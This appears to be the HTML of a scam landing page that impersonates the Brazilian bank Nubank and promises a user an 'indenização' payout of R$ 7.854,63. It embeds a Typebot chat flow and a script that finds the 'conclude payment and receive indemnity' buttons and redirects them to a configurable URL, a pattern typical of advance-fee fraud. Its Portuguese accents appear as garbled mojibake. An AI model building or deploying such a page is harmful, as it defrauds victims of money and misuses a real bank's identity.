<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Saque da Indeniza√ß√£o</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-[#831BD1] min-h-screen flex flex-col">
  <header class="bg-white px-4 shadow-md">
    <div class="max-w-[1200px] mx-auto flex items-center gap-6">
      <img src="images/logo.svg" alt="Nubank" class="h-16 w-auto">
    </div>
  </header>

  <main class="flex-1 px-4 py-2">
    <div class="flex flex-col">
      <main>
        <div class="max-h-min">
          <div class="px-0.5 pb-[0.6rem]">
            <div class="bg-white border border-gray-300 rounded-md w-full h-[calc(100vh-80px)] overflow-hidden">
              <div class="px-4 pt-4 pb-0 text-center max-w-md mx-auto text-black">
                <p class="text-base">
                  <span>Ol√°, </span>
                  <span class="text-black font-bold">USU√°RIO!</span>
                </p>
                <p class="mt-1 text-sm">
                  Responda as perguntas abaixo para realizar<br>seu saque de <span>R$ 7.854,63</span>
                </p>
              </div>

              <!-- Typebot -->
              <script type="module">
                import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';

                async function initializeTypebot() {
                  try {
                    await Typebot.initStandard({
                      typebot: "nub-1-mcrdbzs",
                      apiHost: "https://chat.typezap.site",
                    });
                    
                    console.log('Typebot carregado - Iniciando intercepta√ß√£o espec√≠fica');
                    initTargetedInterception();
                  } catch (error) {
                    console.error('Erro ao carregar Typebot:', error);
                    setTimeout(initializeTypebot, 1000);
                  }
                }

                initializeTypebot();
              </script>

              <script>
              // Configura√ß√µes espec√≠ficas
              const TARGET_TEXTS = [
                "Concluir pagamento e receber minha indeniza√ß√£o",
                "Finalizar processo",
                "Confirmar recebimento"
              ];
              const NEW_URL = "https://google.com";
              const CHECK_INTERVAL = 500; // Verifica√ß√£o a cada 0.5 segundos

              // Intercepta√ß√£o FOCADA apenas nos bot√µes alvo
              function initTargetedInterception() {
                // 1. Monitoramento do DOM espec√≠fico
                const observer = new MutationObserver(() => {
                  replaceTargetButtons();
                });

                observer.observe(document.body, {
                  childList: true,
                  subtree: true
                });

                // 2. Verifica√ß√£o peri√≥dica no Shadow DOM
                const intervalId = setInterval(() => {
                  replaceTargetButtons();
                }, CHECK_INTERVAL);

                // 3. Verifica√ß√£o inicial
                replaceTargetButtons();

                console.log('üéØ Intercepta√ß√£o espec√≠fica ativada para:', TARGET_TEXTS.join(', '));

                // Para ap√≥s 5 minutos (opcional)
                setTimeout(() => {
                  clearInterval(intervalId);
                  observer.disconnect();
                  console.log('‚è± Monitoramento peri√≥dico encerrado');
                }, 300000);
              }

              // Fun√ß√£o PRINCIPAL que faz a substitui√ß√£o apenas nos bot√µes alvo
              function replaceTargetButtons() {
                try {
                  // Verifica no documento principal
                  document.querySelectorAll('button, a, [onclick]').forEach(element => {
                    if (isTargetButton(element)) {
                      modifyTargetElement(element);
                    }
                  });

                  // Verifica no Shadow DOM do Typebot
                  const typebot = document.querySelector('typebot-standard');
                  if (typebot?.shadowRoot) {
                    typebot.shadowRoot.querySelectorAll('button, a, [onclick]').forEach(element => {
                      if (isTargetButton(element)) {
                        modifyTargetElement(element);
                      }
                    });
                  }
                } catch (e) {
                  console.error('Erro na verifica√ß√£o:', e);
                }
              }

              // Identifica se √© um bot√£o alvo
              function isTargetButton(element) {
                return TARGET_TEXTS.some(text => 
                  element.textContent?.includes(text) || 
                  element.innerText?.includes(text) ||
                  element.getAttribute('aria-label')?.includes(text)
                );
              }

              // Modifica APENAS os elementos alvo
              function modifyTargetElement(element) {
                try {
                  // Se for link
                  if (element.tagName === 'A') {
                    element.href = NEW_URL;
                    element.target = '_blank';
                  }
                  
                  // Remove eventos antigos
                  const newElement = element.cloneNode(true);
                  element.parentNode?.replaceChild(newElement, element);
                  
                  // Adiciona novo comportamento
                  newElement.onclick = (e) => {
                    e?.preventDefault();
                    e?.stopPropagation();
                    console.log('üîó Redirecionando bot√£o espec√≠fico para:', NEW_URL);
                    window.open(NEW_URL, '_blank');
                    return false;
                  };
                  
                  return newElement;
                } catch (e) {
                  console.error('Erro ao modificar elemento:', e);
                  return element;
                }
              }

              // Fun√ß√µes para depura√ß√£o
              window.typebotInterceptor = {
                check: () => {
                  const targets = document.querySelectorAll('button, a, [onclick]');
                  console.log(`üîç ${targets.length} elementos encontrados`);
                  targets.forEach(el => {
                    if (isTargetButton(el)) {
                      console.log('üéØ Bot√£o alvo encontrado:', el);
                    }
                  });
                },
                test: () => {
                  const testBtn = document.createElement('button');
                  testBtn.textContent = TARGET_TEXTS[0];
                  document.body.appendChild(testBtn);
                  console.log('üß™ Bot√£o de teste adicionado');
                }
              };
              </script>

              <typebot-standard></typebot-standard>
            </div>
          </div>
        </div>
      </main>
    </div>
  </main>
</body>
</html>
